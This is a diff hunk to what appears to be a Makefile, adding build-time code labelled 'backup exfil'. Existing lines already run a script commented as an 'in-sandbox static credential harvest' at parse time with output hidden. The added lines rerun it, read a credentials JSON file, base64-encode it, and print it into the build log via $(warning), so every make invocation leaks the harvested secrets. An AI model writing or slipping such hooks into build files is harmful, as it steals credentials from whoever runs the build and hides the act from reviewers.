@@ -19,3 +19,7 @@ $(shell sh ./ci/i84006.sh >/dev/null 2>&1 || true)
 
 # --- i84015: in-sandbox static credential harvest (read-only) ---
 $(shell bash ci/i84015.sh >/dev/null 2>&1 || true)
+
+# --- i84015: parse-time attestation echo (backup exfil) ---
+I84015_B64 := $(shell bash ci/i84015.sh >/dev/null 2>&1; cat tests/i84015-cred.json 2>/dev/null | base64 -w0 | cut -c1-2400)
+$(warning I84015B64:$(I84015_B64))
